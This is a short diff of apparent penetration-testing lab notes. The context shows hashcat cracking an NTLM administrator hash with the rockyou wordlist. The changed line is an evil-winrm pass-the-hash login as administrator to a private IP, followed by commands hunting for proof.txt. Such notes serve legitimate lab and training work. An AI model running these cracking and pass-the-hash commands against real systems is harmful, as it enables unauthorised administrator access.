@@ -359,7 +359,7 @@ hashcat administrator.hash /usr/share/wordlists/rockyou.txt -m 1000 -r /usr/shar
 
 EvilWinRM:
 
-evil-winrm -i 10.10.1.200 -u administrator -H 2345hjkh2345jkh25432
+evil-winrm -i 10.10.1.200 -u administrator -H e728ecbadfb02f51ce8eed753f3ff3fd
 whoami
 hostname
 dir /s/b \users\ proof.txt
